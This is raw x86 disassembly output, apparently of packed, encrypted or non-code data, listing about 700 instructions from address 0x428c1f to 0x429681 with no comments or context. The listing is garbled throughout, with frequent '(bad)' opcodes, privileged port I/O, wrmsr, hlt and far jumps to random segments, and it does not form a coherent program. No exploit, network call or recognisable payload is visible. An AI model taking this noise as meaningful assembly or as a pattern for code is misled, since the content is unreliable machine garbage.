  428c1f:	cmp    al,0xfa
  428c21:	std    
  428c22:	push   0x7f363221
  428c27:	jae    0x428c70
  428c29:	mov    ds:0x8190cdc9,al
  428c2e:	cmp    edx,DWORD PTR [ebx]
  428c30:	ret    0xf774
  428c33:	mov    ebp,0xaf1c2d2e
  428c38:	in     al,dx
  428c39:	loope  0x428be2
  428c3b:	and    al,0xb5
  428c3d:	inc    esp
  428c3e:	add    esp,DWORD PTR [edx-0x289050e0]
  428c44:	dec    edx
  428c45:	out    dx,al
  428c46:	xlat   BYTE PTR ds:[ebx]
  428c47:	sbb    dh,ch
  428c49:	add    DWORD PTR [esi+ecx*4],edx
  428c4c:	and    edx,DWORD PTR [edi-0x1e4f308b]
  428c52:	add    DWORD PTR [edi+0x42],esi
  428c55:	fs xchg ecx,eax
  428c57:	adc    ch,dh
  428c59:	ror    BYTE PTR [ecx],cl
  428c5b:	inc    ebx
  428c5c:	fwait
  428c5d:	xchg   esi,ebp
  428c5f:	or     DWORD PTR [ebx],esp
  428c61:	(bad)  
  428c63:	repz (bad) 
  428c65:	out    dx,eax
  428c66:	push   ebp
  428c67:	imul   ecx,edx,0x13
  428c6a:	in     al,0x73
  428c6c:	push   edx
  428c6d:	pusha  
  428c6e:	xchg   ecx,eax
  428c6f:	or     ch,ah
  428c71:	mov    es,edx
  428c73:	pop    edx
  428c74:	jbe    0x428c98
  428c76:	popa   
  428c77:	pop    edx
  428c78:	pop    esi
  428c79:	xchg   ebx,eax
  428c7a:	sbb    eax,0xcb7ac471
  428c7f:	(bad)  
  428c80:	fs push ss
  428c82:	clc    
  428c83:	imul   DWORD PTR ds:0xc8571cc1
  428c89:	fbstp  TBYTE PTR [edx-0x4df479c3]
  428c8f:	xor    eax,0x7eb12b5c
  428c94:	cli    
  428c95:	popa   
  428c96:	push   cs
  428c97:	dec    esi
  428c98:	ja     0x428ce3
  428c9a:	(bad)  
  428c9b:	cmp    al,0x9c
  428c9d:	jo     0x428ca3
  428c9f:	or     al,0x37
  428ca1:	xor    DWORD PTR [edi],esp
  428ca3:	outs   dx,DWORD PTR ds:[esi]
  428ca4:	jae    0x428c43
  428ca6:	sub    DWORD PTR [edi],eax
  428ca8:	jns    0x428cea
  428caa:	sti    
  428cab:	xchg   esi,eax
  428cac:	fmul   QWORD PTR [edx]
  428cae:	into   
  428caf:	dec    edx
  428cb0:	int    0xb6
  428cb2:	stos   BYTE PTR es:[edi],al
  428cb3:	lock mov ds:0x23853d70,al
  428cb9:	scas   al,BYTE PTR es:[edi]
  428cba:	sbb    ecx,DWORD PTR [esi-0x635c1196]
  428cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428cc1:	dec    edi
  428cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428cc3:	xor    al,0xc3
  428cc5:	push   es
  428cc6:	mov    ebp,0xd37d2047
  428ccb:	cmp    al,0xb0
  428ccd:	cld    
  428cce:	lock push edi
  428cd0:	inc    edi
  428cd1:	daa    
  428cd2:	in     eax,dx
  428cd3:	mov    bh,0x8c
  428cd5:	sbb    bl,ah
  428cd7:	(bad)  
  428cd8:	(bad)  
  428cda:	pop    esp
  428cdb:	stos   BYTE PTR es:[edi],al
  428cdc:	jns    0x428cfa
  428cde:	js     0x428cfb
  428ce0:	out    dx,al
  428ce1:	call   0xa8ff:0x3a3b70bf
  428ce8:	dec    eax
  428ce9:	mov    dh,0xca
  428ceb:	add    BYTE PTR [ecx+0x61],bh
  428cee:	xchg   DWORD PTR [edi],edx
  428cf0:	jl     0x428d6a
  428cf2:	or     edx,DWORD PTR [edi-0x4e100188]
  428cf8:	jb     0x428d0a
  428cfa:	sbb    al,0x99
  428cfc:	adc    al,dh
  428cfe:	pusha  
  428cff:	xor    eax,0x8fe2da50
  428d04:	adc    BYTE PTR ds:[ebx],ch
  428d07:	sti    
  428d08:	add    BYTE PTR [ebx+0x1c],cl
  428d0b:	hlt    
  428d0c:	in     al,0x1f
  428d0e:	lock dec ebp
  428d10:	mov    ebx,0x0
	...
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x29ad
  428d82:	pop    ecx
  428d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d84:	aaa    
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0x5e000001,al
  428d8d:	pusha  
  428d8e:	and    eax,0x46cf454
  428d93:	sbb    bh,ah
  428d95:	enter  0xd2a3,0x27
  428d99:	aas    
  428d9a:	call   0x4186c9e5
  428d9f:	das    
  428da0:	rcl    dl,0x36
  428da3:	xlat   BYTE PTR ds:[ebx]
  428da4:	push   0xffffffe1
  428da6:	xchg   esi,eax
  428da7:	repnz cwde 
  428da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428daa:	pushf  
  428dab:	pusha  
  428dac:	jb     0x428d7a
  428dae:	push   ds
  428daf:	or     al,0x74
  428db1:	xor    DWORD PTR [ebx+0x438064da],ecx
  428db7:	dec    edi
  428db8:	or     bh,bl
  428dba:	jmp    0x1f5:0xf43e1304
  428dc1:	aam    0x31
  428dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428dc4:	dec    ecx
  428dc5:	mov    esi,ss
  428dc7:	pop    ds
  428dc8:	mov    esi,0x2ac5cc21
  428dcd:	std    
  428dce:	jecxz  0x428d97
  428dd0:	fild   DWORD PTR [eax+edi*8+0x7ac2ace5]
  428dd7:	(bad)  
  428dd8:	not    BYTE PTR [ecx+0x7d1a1ac6]
  428dde:	or     dl,BYTE PTR [edi-0x2434d21a]
  428de4:	mov    ah,0x37
  428de6:	xchg   BYTE PTR [edx-0x17],bh
  428de9:	dec    ebp
  428dea:	arpl   WORD PTR [ecx+0x33],cx
  428ded:	dec    ebp
  428dee:	xor    eax,0x7ba3432
  428df3:	xor    eax,DWORD PTR [ebp-0xe]
  428df6:	jecxz  0x428e22
  428df8:	mov    ah,0x53
  428dfa:	push   es
  428dfb:	(bad)  
  428dfc:	leave  
  428dfd:	xor    bh,ah
  428dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e00:	fs add eax,0x9f1f2639
  428e06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e07:	fiadd  WORD PTR [edi+esi*8-0x6267fbc9]
  428e0e:	pusha  
  428e0f:	pop    ebx
  428e10:	ins    BYTE PTR es:[edi],dx
  428e11:	dec    esp
  428e12:	mov    ebx,0xcc1d249c
  428e17:	fwait
  428e18:	dec    eax
  428e19:	sub    edx,DWORD PTR [edx]
  428e1b:	sub    dh,ch
  428e1d:	push   0x24
  428e1f:	push   esi
  428e20:	mov    bl,0xe5
  428e22:	inc    eax
  428e23:	push   es
  428e24:	stc    
  428e25:	cdq    
  428e26:	mov    esi,DWORD PTR [ebp-0x2f97a50d]
  428e2c:	icebp  
  428e2d:	cmc    
  428e2e:	(bad)  
  428e2f:	js     0x428e19
  428e31:	cli    
  428e32:	test   edx,eax
  428e34:	xor    DWORD PTR [ebp+0x3f],esp
  428e37:	pop    ecx
  428e38:	(bad)  
  428e39:	ror    DWORD PTR [ebx+0x9],cl
  428e3c:	and    bh,BYTE PTR [ebp+0x6c]
  428e3f:	add    BYTE PTR [eax+0x2937ad2],cl
  428e45:	cmp    eax,0xf8065178
  428e4a:	repnz add cl,BYTE PTR [edx+0x7a]
  428e4e:	mov    edi,0xa47a3a46
  428e53:	popa   
  428e54:	shr    DWORD PTR [edx+0x54973018],0xf4
  428e5b:	inc    edi
  428e5c:	adc    DWORD PTR [eax-0x7d],ecx
  428e5f:	sub    al,0x5d
  428e61:	jmp    0xc269986f
  428e66:	ins    BYTE PTR es:[edi],dx
  428e67:	frstor [esi]
  428e69:	into   
  428e6a:	adc    ecx,DWORD PTR [esi-0x78c847a3]
  428e70:	in     eax,0x20
  428e72:	cmp    DWORD PTR fs:[edx+0x5e],eax
  428e76:	rcr    DWORD PTR [edx],cl
  428e78:	mov    esi,0xb3ccd4b1
  428e7d:	mov    edi,0x954101d3
  428e82:	and    esi,DWORD PTR [edi]
  428e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e85:	mov    ah,0xde
  428e87:	push   edi
  428e88:	add    ecx,DWORD PTR [ebx-0x3f]
  428e8b:	ins    DWORD PTR es:[edi],dx
  428e8c:	sub    bh,BYTE PTR [ebx+0x7]
  428e8f:	out    0x51,al
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x3a
  428f01:	cli    
  428f02:	jb     0x428e95
  428f04:	cmp    al,0xb6
  428f06:	add    DWORD PTR [eax],eax
  428f08:	add    eax,0xd4000001
  428f0d:	lds    eax,FWORD PTR [ecx-0x4f41d3e9]
  428f13:	xor    al,0x7b
  428f15:	mov    fs:0x78cdd631,eax
  428f1b:	inc    eax
  428f1c:	xchg   edi,eax
  428f1d:	mov    ebx,0x19923faf
  428f22:	sub    DWORD PTR [edx+0x178816b7],0x77
  428f29:	jge    0x428f1f
  428f2b:	stc    
  428f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f2d:	sahf   
  428f2e:	xchg   edx,eax
  428f2f:	xchg   ebp,eax
  428f30:	popf   
  428f31:	ins    BYTE PTR es:[edi],dx
  428f32:	and    ah,BYTE PTR [ebx+0x2a791aba]
  428f38:	jle    0x428f10
  428f3a:	pop    esp
  428f3b:	ret    
  428f3c:	and    al,0x1b
  428f3e:	pushf  
  428f3f:	jb     0x428f05
  428f41:	adc    DWORD PTR [edx-0x1c360820],esi
  428f47:	fisttp DWORD PTR [edi-0x17]
  428f4a:	inc    ebp
  428f4b:	fidiv  WORD PTR [edi]
  428f4d:	sub    eax,0x28bbed77
  428f52:	test   BYTE PTR [edx+ebx*1],dh
  428f55:	cli    
  428f56:	mov    cl,0x1
  428f58:	jl     0x428ee7
  428f5a:	pushf  
  428f5b:	add    DWORD PTR [edi+0xf],eax
  428f5e:	mov    ds:0x55b7dbc7,al
  428f63:	sub    DWORD PTR [eax],edi
  428f65:	fisttp QWORD PTR [edx-0xe18b4a8]
  428f6b:	push   ss
  428f6c:	mov    al,ds:0x5dbcb8c9
  428f71:	cs mov ch,0x76
  428f74:	adc    esi,DWORD PTR [edi+0x3ccca4e0]
  428f7a:	mov    bl,BYTE PTR [edx-0x51]
  428f7d:	loopne 0x428fe0
  428f7f:	test   DWORD PTR [ebx+0x5f9c48d9],ebx
  428f85:	or     cl,bl
  428f87:	pop    eax
  428f88:	add    al,0x39
  428f8a:	xchg   edx,eax
  428f8b:	push   ds
  428f8c:	call   0x4c65:0xfece4c86
  428f93:	and    al,0x4d
  428f95:	neg    cl
  428f97:	out    0xd6,al
  428f99:	push   ss
  428f9a:	adc    al,0x8b
  428f9c:	mov    bl,ah
  428f9e:	xchg   ecx,eax
  428f9f:	xchg   edi,ebp
  428fa1:	dec    edx
  428fa2:	cmp    ecx,esi
  428fa4:	xlat   BYTE PTR ds:[ebx]
  428fa5:	cmp    eax,0x9f3583b6
  428faa:	(bad)  
  428fac:	ins    BYTE PTR es:[edi],dx
  428fad:	or     al,0xf7
  428faf:	pop    ecx
  428fb0:	fs std 
  428fb2:	(bad)  
  428fb3:	and    al,0xf4
  428fb5:	mov    WORD PTR [ecx-0xb],?
  428fb8:	sbb    al,0x50
  428fba:	fs scas eax,DWORD PTR es:[edi]
  428fbc:	sahf   
  428fbd:	out    0x64,eax
  428fbf:	scas   al,BYTE PTR es:[edi]
  428fc0:	out    0x4b,eax
  428fc2:	push   ss
  428fc3:	xchg   ecx,eax
  428fc4:	in     al,0x64
  428fc6:	pop    ebx
  428fc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fc8:	mov    cl,0x81
  428fca:	sbb    bh,BYTE PTR [esi+0x0]
  428fcd:	test   eax,0x11e241b1
  428fd2:	popf   
  428fd3:	cld    
  428fd4:	cvtps2pi mm1,QWORD PTR [edi-0xe]
  428fd8:	repnz shl DWORD PTR [edi],cl
  428fdb:	loopne 0x428f7e
  428fdd:	out    0x30,al
  428fdf:	push   ecx
  428fe0:	outs   dx,BYTE PTR ds:[esi]
  428fe1:	push   edi
  428fe2:	rcr    BYTE PTR [ecx-0x521ba8aa],cl
  428fe8:	pop    ebp
  428fe9:	adc    edi,DWORD PTR [ebx-0x11a39f4]
  428fef:	cld    
  428ff0:	rol    DWORD PTR [eax],1
  428ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ff3:	push   0xffffff89
  428ff5:	push   edi
  428ff6:	inc    eax
  428ff7:	aas    
  428ff8:	cmp    al,0x1d
  428ffa:	adc    eax,0x108df4d3
  428fff:	ret    
  429000:	jecxz  0x42901f
  429002:	imul   esp,DWORD PTR [esi+edi*1],0xf
  429006:	test   al,0x97
  429008:	sub    DWORD PTR [ebp-0x77],0xffffffff
  42900c:	adc    dl,BYTE PTR [edi+0x3ee080]
	...
  429072:	add    BYTE PTR [eax],al
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x39fc7b77
  429081:	push   ss
  429082:	fisttp DWORD PTR [edi+0x41]
  429085:	mov    bh,0x1
  429087:	add    BYTE PTR ds:0xf5000001,al
  42908d:	sbb    cl,BYTE PTR [edx+0x1b8a7a53]
  429093:	wrmsr  
  429095:	adc    eax,0xb6cecc5
  42909a:	call   0xaeefb85b
  42909f:	push   ecx
  4290a0:	mov    cl,0xe7
  4290a2:	sub    BYTE PTR [eax+0x5eaaf7a5],0x96
  4290a9:	sbb    DWORD PTR [ebx+0x3f62fb72],0x9342f3d
  4290b3:	sti    
  4290b4:	xor    bh,0xda
  4290b7:	int    0x6a
  4290b9:	xchg   DWORD PTR [ecx+eax*8+0x56],eax
  4290bd:	and    ch,bl
  4290bf:	aaa    
  4290c0:	push   edx
  4290c1:	in     al,dx
  4290c2:	call   0x324f5dac
  4290c7:	(bad)
  4290cc:	fs aad 0x39
  4290cf:	out    0x3a,eax
  4290d1:	mov    BYTE PTR [esi],bl
  4290d3:	call   0x1fe75a2f
  4290d8:	shr    DWORD PTR [ecx+0x77],0x14
  4290dc:	(bad)  [edx+0x64]
  4290df:	fs call 0xa254:0xf0b6a94f
  4290e7:	mov    ?,WORD PTR [edx+0x5a]
  4290ea:	ret    
  4290eb:	jle    0x429141
  4290ed:	retf   0xda73
  4290f0:	scas   al,BYTE PTR es:[edi]
  4290f1:	and    edx,0x2a
  4290f4:	das    
  4290f5:	and    al,0xcd
  4290f7:	jb     0x4290e3
  4290f9:	and    al,0x87
  4290fb:	out    dx,eax
  4290fc:	ins    BYTE PTR es:[edi],dx
  4290fd:	cld    
  4290fe:	mov    ds,ecx
  429100:	pop    ebx
  429101:	xor    eax,0x47ffc370
  429106:	adc    eax,0xdfbbfb15
  42910b:	jne    0x4290b5
  42910d:	mov    ds:0xb31a11b4,al
  429112:	fisttp DWORD PTR [ecx-0xc]
  429115:	inc    eax
  429116:	push   ebp
  429117:	jle    0x429172
  429119:	add    al,0x2b
  42911b:	xor    cl,BYTE PTR [ecx-0x1a]
  42911e:	mov    al,ds:0x2ac76681
  429123:	xchg   esi,eax
  429124:	je     0x4290dc
  429126:	jne    0x4291a4
  429128:	jmp    0x366dd296
  42912d:	out    dx,al
  42912e:	ins    BYTE PTR es:[edi],dx
  42912f:	out    0xad,al
  429131:	add    ebx,DWORD PTR [ebx-0x48b578d7]
  429137:	mov    cl,0x9f
  429139:	icebp  
  42913a:	int    0xa6
  42913c:	pop    edi
  42913d:	fisttp DWORD PTR [esi-0x29ac8f1c]
  429143:	ins    DWORD PTR es:[edi],dx
  429144:	jmp    DWORD PTR [edx]
  429146:	aad    0xb2
  429148:	mov    dl,0xbe
  42914a:	and    eax,0xd14991dc
  42914f:	cmc    
  429150:	retf   
  429151:	popf   
  429152:	mov    ah,BYTE PTR [esi+0x2372b3]
  429158:	jb     0x4291a6
  42915a:	jmp    0x851d:0xe62aad6f
  429161:	xor    ah,BYTE PTR [eax]
  429163:	sub    DWORD PTR [ebp+0x195a4a0a],0xf237dc73
  42916d:	jl     0x4291df
  42916f:	mov    eax,0x691dcdf9
  429174:	(bad)  
  429175:	les    ebp,FWORD PTR [esi-0x1fa75143]
  42917b:	(bad)  
  42917c:	out    0x6c,al
  42917e:	arpl   bp,di
  429180:	aam    0xd1
  429182:	jge    0x42912a
  429184:	in     al,0xc0
  429186:	or     esp,DWORD PTR [edx-0x42]
  429189:	out    dx,eax
  42918a:	adc    dl,ch
  42918c:	retf   
  42918d:	jmp    0x4291c7
  42918f:	xchg   DWORD PTR [edi+0x0],edi
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [edi+edx*2+0x4600fafa],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [esi-0x80b9912],dh
  429211:	pop    es
  429212:	xor    edx,DWORD PTR [edx-0x4b]
  429215:	fsub   st,st(5)
  429217:	xor    ah,BYTE PTR [ebx+0x1e]
  42921a:	fcom   DWORD PTR [ebp-0x21d503e0]
  429220:	pop    esi
  429221:	dec    esi
  429222:	pop    esi
  429223:	in     eax,0x1b
  429225:	add    al,0x72
  429227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429228:	dec    ebp
  429229:	sbb    DWORD PTR [ebp+0x355945d8],eax
  42922f:	sub    BYTE PTR [ecx-0x49fd6ab5],bl
  429235:	test   DWORD PTR [esi-0x2fe61e07],ebx
  42923b:	into   
  42923c:	aad    0x53
  42923e:	les    ebx,FWORD PTR [edi+0xb02d8be]
  429244:	xor    al,0x55
  429246:	add    DWORD PTR [edi+0x4e7341f],eax
  42924c:	pushf  
  42924d:	rol    BYTE PTR [ebx+edi*2],cl
  429250:	scas   eax,DWORD PTR es:[edi]
  429251:	fs int3 
  429253:	in     eax,0xfe
  429255:	mov    ch,0x4b
  429257:	and    BYTE PTR [edx],dh
  429259:	mov    DWORD PTR [esi+ecx*8],esp
  42925c:	sbb    eax,0xfe4e7cb7
  429261:	mov    al,ds:0xe8ae2e9c
  429266:	ja     0x42921f
  429268:	std    
  429269:	mov    esi,0x1dee2394
  42926e:	jecxz  0x4292bc
  429270:	mov    dl,0xa8
  429272:	cmp    esi,esp
  429274:	mov    ds:0xd2ffd41e,al
  429279:	cmp    BYTE PTR [eax-0x5ce4942e],bh
  42927f:	cmp    al,0xa7
  429281:	adc    al,0xa2
  429283:	call   eax
  429285:	cld    
  429286:	dec    esi
  429287:	aam    0x1e
  429289:	scas   al,BYTE PTR es:[edi]
  42928a:	les    edx,FWORD PTR gs:[edi-0x4a9d4add]
  429291:	and    al,0x86
  429293:	jnp    0x4292c5
  429295:	es cmp eax,0x1fef42fb
  42929b:	add    ecx,ebx
  42929d:	jbe    0x4292d6
  42929f:	mov    ebx,0x5812320e
  4292a4:	or     eax,0x8895d997
  4292a9:	into   
  4292aa:	retf   
  4292ab:	psubd  mm2,QWORD PTR [ebp+0x75227818]
  4292b2:	jmp    DWORD PTR [edi]
  4292b4:	lock imul eax,DWORD PTR [edx-0x4a],0xd9e022bd
  4292bc:	xchg   esp,eax
  4292bd:	dec    ebp
  4292be:	mov    dh,0xe3
  4292c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292c1:	sub    DWORD PTR [ecx-0x5a],0x33203a9
  4292c8:	inc    esp
  4292c9:	addr16 mov edx,0xac2c4a17
  4292cf:	rcr    DWORD PTR [edi+0x14],cl
  4292d2:	int    0xec
  4292d4:	ror    BYTE PTR [esi+0x3806a614],cl
  4292da:	popa   
  4292db:	push   edx
  4292dc:	push   esp
  4292dd:	sbb    DWORD PTR [ebx],esp
  4292df:	pop    ecx
  4292e0:	(bad)  
  4292e1:	or     eax,0x542a1462
  4292e6:	lods   eax,DWORD PTR cs:[esi]
  4292e8:	cmp    BYTE PTR [ebx+0x3d36d34b],0xa6
  4292ef:	pop    esp
  4292f0:	pop    ds
  4292f1:	out    dx,al
  4292f2:	and    DWORD PTR [ecx-0x14d13fd6],edx
  4292f8:	xor    dl,ah
  4292fa:	arpl   WORD PTR [edi+ebp*4],bx
  4292fd:	sbb    dh,BYTE PTR ds:[ecx]
  429300:	mov    al,0xfc
  429302:	pusha  
  429303:	fmul   st(2),st
  429305:	jmp    0xe1df4c83
  42930a:	mov    al,0x53
  42930c:	ds pop ds
  42930e:	enter  0x7a44,0x0
	...
  429372:	add    BYTE PTR [eax],al
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xab
  429381:	dec    edx
  429382:	aas    
  429383:	cmp    cl,BYTE PTR [ebx-0x47]
  429386:	add    DWORD PTR [eax],eax
  429388:	add    eax,0x56000001
  42938d:	fdivr  DWORD PTR [ecx-0x7c21a815]
  429393:	jl     0x429330
  429395:	pop    es
  429396:	or     eax,0xa00dd3a3
  42939b:	shl    eax,cl
  42939d:	arpl   WORD PTR [esi+ecx*4-0x4],ax
  4293a1:	xor    DWORD PTR [ebx],eax
  4293a3:	aam    0x41
  4293a5:	xchg   DWORD PTR [ebp+0x40a5b485],ebx
  4293ab:	sbb    ebx,DWORD PTR [esi+0x4d]
  4293ae:	aaa    
  4293af:	mov    edx,DWORD PTR [ecx-0x80]
  4293b2:	jle    0x42935c
  4293b4:	add    dl,bh
  4293b6:	repz jo 0x429367
  4293b9:	scas   eax,DWORD PTR es:[edi]
  4293ba:	cmp    BYTE PTR [esi],0xe0
  4293bd:	ret    
  4293be:	inc    edx
  4293bf:	inc    ecx
  4293c0:	xchg   ebp,eax
  4293c1:	inc    ebp
  4293c2:	aas    
  4293c3:	dec    ecx
  4293c4:	xor    BYTE PTR [ebx+0x6a],0x8a
  4293c8:	retf   
  4293c9:	das    
  4293ca:	adc    al,0x85
  4293cc:	pop    ebp
  4293cd:	mov    edx,esi
  4293cf:	cmp    eax,0xb454e9b4
  4293d4:	xchg   edi,eax
  4293d5:	xor    DWORD PTR cs:[edx+0x35cb010c],ecx
  4293dc:	jmp    0x4293e6
  4293de:	(bad)  
  4293df:	push   edx
  4293e0:	mov    al,0x6b
  4293e2:	push   esp
  4293e3:	nop
  4293e4:	dec    edi
  4293e5:	addr16 dec ebx
  4293e7:	push   es
  4293e8:	or     cl,BYTE PTR [edi]
  4293ea:	(bad)  
  4293ec:	or     DWORD PTR [eax],edi
  4293ee:	push   edx
  4293ef:	xchg   ebp,eax
  4293f0:	inc    eax
  4293f1:	nop
  4293f2:	push   es
  4293f3:	jns    0x42942c
  4293f5:	push   eax
  4293f6:	mov    ebx,0x554c8d29
  4293fb:	aad    0x55
  4293fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293fe:	add    al,0x28
  429400:	and    eax,0xaed2d047
  429405:	(bad)  
  429407:	inc    ebx
  429408:	int3   
  429409:	dec    eax
  42940a:	push   0xab9c9b57
  42940f:	(bad)  
  429410:	loopne 0x429395
  429412:	loop   0x42947e
  429414:	xchg   edi,eax
  429415:	out    dx,al
  429416:	pop    es
  429417:	mov    ah,0xf4
  429419:	pop    es
  42941a:	and    al,0x7
  42941c:	mov    esp,0xd52ec687
  429421:	inc    ecx
  429422:	lds    eax,FWORD PTR [esi]
  429424:	fadd   QWORD PTR [eax+0x75af8869]
  42942a:	addr16 mov ebx,0xb094c581
  429430:	dec    ebp
  429431:	or     esi,eax
  429433:	pop    edi
  429434:	mov    bl,BYTE PTR [esi-0x13]
  429437:	imul   DWORD PTR [ecx]
  429439:	mov    ebp,ecx
  42943b:	ret    0x1fb9
  42943e:	pop    es
  42943f:	adc    DWORD PTR [esi],edi
  429441:	xchg   edx,eax
  429442:	mov    bl,BYTE PTR [ecx]
  429444:	xchg   esp,eax
  429445:	div    BYTE PTR ds:[eax]
  429448:	dec    ecx
  429449:	jecxz  0x4294aa
  42944b:	call   0xe80a:0x9a49cab1
  429452:	repnz les ebp,FWORD PTR [ebx-0x59]
  429456:	sbb    edi,esi
  429458:	dec    eax
  429459:	ds inc ebp
  42945b:	mov    ds:0xd369a7dc,eax
  429460:	iret   
  429461:	push   0xffffffa2
  429463:	cmp    dh,BYTE PTR [ebx-0x5e]
  429466:	cs cmc 
  429468:	mov    edx,0x1eb33d4d
  42946d:	daa    
  42946e:	sbb    BYTE PTR [ecx],bh
  429470:	xchg   edx,eax
  429471:	jo     0x42946d
  429473:	cs pop edx
  429475:	xchg   esp,eax
  429476:	mov    ebx,0xe964ec37
  42947b:	adc    dl,BYTE PTR [eax]
  42947d:	sar    al,cl
  42947f:	mov    esi,0x64d95742
  429484:	mov    bh,0xa7
  429486:	cmp    BYTE PTR [ebx-0x3438e7b],0xb7
  42948d:	cmp    BYTE PTR [ebx+0x1cb8],dl
	...
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp-0x447e6016],dx
  429503:	add    al,0x50
  429505:	mov    edx,0x1050001
  42950a:	add    BYTE PTR [eax],al
  42950c:	xchg   BYTE PTR [ebx],bl
  42950e:	rol    dh,0x19
  429511:	leave  
  429512:	ret    
  429513:	mov    bh,BYTE PTR [ebp-0x9]
  429516:	int3   
  429517:	pushf  
  429518:	push   eax
  429519:	mov    ah,0xa0
  42951b:	je     0x4294b8
  42951d:	repz jnp 0x429523
  429520:	fistp  QWORD PTR [edx-0x17dc97de]
  429526:	mov    esi,0xb829f6bb
  42952b:	inc    eax
  42952c:	pop    esp
  42952d:	push   ss
  42952e:	ins    DWORD PTR es:[edi],dx
  42952f:	add    DWORD PTR [edi-0x37],edx
  429532:	xor    BYTE PTR [ecx+0x46],bh
  429535:	xchg   ebx,eax
  429536:	cdq    
  429537:	inc    edx
  429538:	mov    ch,BYTE PTR [ecx]
  42953a:	jae    0x429500
  42953c:	jecxz  0x4294eb
  42953e:	sbb    ebx,DWORD PTR [ecx]
  429540:	jge    0x429517
  429542:	test   eax,0x9088289d
  429547:	ror    ecx,0xfc
  42954a:	mov    eax,ds:0xfb4ba1c7
  42954f:	push   eax
  429550:	and    BYTE PTR [esi],cl
  429552:	lods   eax,DWORD PTR ds:[esi]
  429553:	sub    al,0xe1
  429555:	jmp    0xed74:0x9038adb6
  42955c:	rcr    DWORD PTR [edi+0x63ebf200],cl
  429562:	int    0x77
  429564:	bound  eax,QWORD PTR [edx]
  429566:	cmp    dl,bh
  429568:	mov    al,0x5d
  42956a:	sbb    al,0xd0
  42956c:	nop
  42956d:	mov    WORD PTR [eax+ebp*4-0x471e87f8],es
  429574:	mov    eax,0x4166801f
  429579:	loope  0x429537
  42957b:	mov    bh,0x4c
  42957d:	daa    
  42957e:	fisubr DWORD PTR [ecx+0x70]
  429581:	pop    esp
  429582:	sub    BYTE PTR [eax],0xa1
  429585:	fsqrt  
  429587:	or     BYTE PTR [esi],ch
  429589:	cs push 0xffffffb3
  42958c:	in     al,dx
  42958d:	cmc    
  42958e:	lock mov bh,BYTE PTR [di-0x7c16]
  429594:	sub    esp,ecx
  429596:	mov    al,ds:0x5744528a
  42959b:	mov    edi,ebp
  42959d:	outs   dx,DWORD PTR ds:[esi]
  42959e:	sbb    eax,0x3e3b8d3e
  4295a3:	fcmove st,st(0)
  4295a5:	and    BYTE PTR [edi+esi*8+0x71bb1c42],0xf4
  4295ad:	pop    esi
  4295ae:	test   eax,0xb3e7c8bc
  4295b3:	mov    ds:0x2c5547c0,eax
  4295b8:	lods   al,BYTE PTR ds:[esi]
  4295b9:	cdq    
  4295ba:	imul   ecx,DWORD PTR [ecx],0x84ffafa
  4295c0:	pop    ds
  4295c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4295c3:	inc    edx
  4295c4:	fistp  DWORD PTR [esi-0x27b31a4d]
  4295ca:	(bad)  
  4295cb:	clc    
  4295cc:	ins    DWORD PTR es:[edi],dx
  4295cd:	js     0x4295c4
  4295cf:	cmp    eax,0x62ba52f1
  4295d4:	xchg   BYTE PTR [ecx+eax*8+0x55],dh
  4295d8:	add    DWORD PTR [edi],0xddcbbeb7
  4295de:	es lahf 
  4295e0:	retf   0x41f5
  4295e3:	sub    bh,BYTE PTR [edx-0x46]
  4295e6:	cmp    DWORD PTR [edi],0x911732bf
  4295ec:	into   
  4295ed:	pushf  
  4295ee:	out    0xc,eax
  4295f0:	jmp    0x36985e2e
  4295f5:	jb     0x42961e
  4295f7:	fcom   DWORD PTR [esi+0x5ad74f09]
  4295fd:	sub    DWORD PTR [ebx+0x3a220c5f],0xe8735e3e
  429607:	sar    BYTE PTR [edx],0xa5
  42960a:	js     0x42963b
  42960c:	fisub  WORD PTR [ebx+0xdb1bed]
	...
  429672:	add    BYTE PTR [eax],al
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	scas   eax,DWORD PTR es:[edi]
  429681:	int3   
